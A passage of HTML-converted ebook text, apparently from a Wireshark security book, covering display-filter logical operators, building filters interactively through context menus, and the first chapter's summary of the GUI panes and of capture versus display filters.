rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:1.8500pt;margin-left:2.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >or</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=76  valign=top  style="width:45.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:5.6000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >||</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=566  valign=top  style="width:339.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:1.7500pt;margin-right:2.0000pt;line-height:17.3000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Logical OR. Returns </span><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >true</span><span style="font-family:'Courier New';letter-spacing:-4.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >if one or both expressions are true.</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr></table></div>
<span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section37" ><table class=MsoNormalTable  border=1  cellspacing=0  style="border-collapse:collapse;width:467.2500pt;margin-left:14.4000pt;mso-table-layout-alt:fixed;border:none;mso-border-left-alt:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);mso-border-insideh:1.0000pt solid rgb(191,191,191);mso-border-insidev:1.0000pt solid rgb(191,191,191);mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:38.7500pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >xor</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=76  valign=top  style="width:45.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:5.6000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >^^</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=566  valign=top  style="width:339.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:2.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Logical Exclusive OR. Returns </span><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >true</span><span style="font-family:'Courier New';letter-spacing:-5.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >if only one of both expressions is true.</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><a name="_bookmark46" ></a>not</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=76  valign=top  style="width:45.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:5.6000pt;" ><span style="font-family:'Courier New';font-size:12.0000pt;" >!</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=566  valign=top  style="width:339.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Logical NOT. Negates the following expression.</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:73.2500pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:14.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=76  valign=top  style="width:45.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:5.6000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[ ]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=566  valign=top  style="width:339.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Slice operator. With this operator a slice (substring) of the string can be accessed. </span><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >dns.resp.name[1..4]</span><span style="font-family:'Courier New';letter-spacing:-5.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >accesses the first four characters of the DNS response name.</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:14.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=76  valign=top  style="width:45.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:5.6000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >( )</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=566  valign=top  style="width:339.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Groups expressions together.</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr></table><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:3.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.2000pt;margin-right:0.0000pt;margin-left:26.7500pt;text-indent:0.0000pt;text-align:left;" ><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:12.5000pt;" >Source</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.6000pt;margin-right:0.0000pt;margin-left:26.7500pt;text-indent:0.0000pt;text-align:left;" ><span><a href="http://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:9.5000pt;" >http://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSecti</span></u></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:9.5000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.5000pt;" ><o:p>&nbsp;</o:p></span></p><h4 style="margin-top:0.0500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Building Display Filters Interactively</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:8.1000pt;" ><span style="position:absolute;z-index:-1;margin-left:612.5000px;margin-top:105.9167px;width:22.0000px;height:17.0000px;" ><img width="22"  height="17"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker56147.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To quickly gain experience at building filters, you can use the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >graphical interface of Wireshark and the various context menus to build filters interactively. Start by right-clicking on a section of a packet that interests you, and then select Apply</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >as</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Filter</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Selected to filter the packet list by the selected variable. For example, selecting the source IP address field and applying a filter to it is a good way to start quickly narrowing down the packets you are interested</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >in.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After filtering for this particular IP address, you might want to add a destination port to the filter to only see traffic from this host to port</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:8.4000pt;" ><span style="position:absolute;z-index:-1;margin-left:497.5000px;margin-top:64.2500px;width:22.0000px;height:17.0000px;" ><img width="22"  height="17"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker56775.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >80. This can also be done in the GUI without throwing away the current filter by right-clicking the source port in the Packet Details pane and selecting Apply</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.7000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >as</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Filter</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Selected to combine the new filter with the old one using </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >and</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The GUI also lists other combinations,</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >such as </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >or</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >not</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, and so on. Additionally, you can use the Prepare as Filter context menu to create the filter without actually applying it to your Packet List</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >pane.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.1500pt;margin-right:11.1500pt;" ><a name="_bookmark47" ></a><span><a href="#_bookmark48" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-6</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows an example of the display filter code after selecting two items: ARP protocol packets and the source MAC address.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section38" ><p class=MsoBodyText ><img width="779"  height="221"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker57375.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark48" ></a><span><a href="#_bookmark47" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-6:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Filter results of ARP from a source address</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><a name="_bookmark49" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After selecting ARP to apply as a filter, only ARP protocol packets from various systems were displayed in the Packet List pane. Subsequently selecting a source MAC (</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SamsungE_e1:ad:3c</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) as a filter expression, the display filter was amended to become </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >arp.src.hw_mac == c4:57:6e:e1:ad:3c</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><a name="_bookmark50" ></a><span><a href="#_bookmark51" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-7</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows how complex filter statements can be built using this technique. As you can see in the status bar, Wireshark might suggest adding parentheses or suggest the User Guide. In upcoming chapters we will build and use many filters; this is just to show that filters can certainly grow past one or two functions.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="780"  height="379"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker58106.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark51" ></a><span><a href="#_bookmark50" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-7:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Complex display filter example</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You can always use the context menus to edit the filter in the Filter bar</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section39" ><p class=MsoBodyText  style="margin-top:3.5500pt;margin-right:11.1500pt;line-height:101%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >after you start it. If building them interactively, make sure you are aware of the filters Wireshark applies for you by noting what syntax was inserted in the Filter bar.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.3000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Building filters interactively provides a great way to understand the most commonly used filter fields and protocols. This will pay off when dealing with advanced Wireshark use cases in the future.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:0.0500pt;" ><a name="Summary" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark52" ></a>Summary</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:10.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Congratulations on finishing the first chapter. It&#8217;s a fairly light chapter, as we haven&#8217;t begun actually working with the application</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >yet. Given the belief that new Wireshark users are commonly surprised by the fast-growing number of packets, the book aims to nip overwhelm before it happens. The two big areas to cover before actually using Wireshark are the GUI and</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >filters.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><a name="_bookmark53" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We provided a general overview of the GUI, focusing on its layout and the reasoning behind it. The layout is divided into three panes: Packet List, Packet Details, and Packet Bytes. The panes present packet data at different levels of detail and serve to help the user drill down to individual bytes.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The chapter also discussed Wireshark&#8217;s two types of filters. You can use capture filters to filter what packets are captured. Capture filters operate while a capture is taking place, screening what network traffic is kept and what traffic is ignored. You also can use display filters to filter what packets are presented. Display filters operate either while a capture is taking place or after a capture has finished.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next chapter presents options for running Wireshark, particularly using virtual environments.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:0.0500pt;" ><a name="_bookmark54" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Exercises" ></a>Exercises</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=17  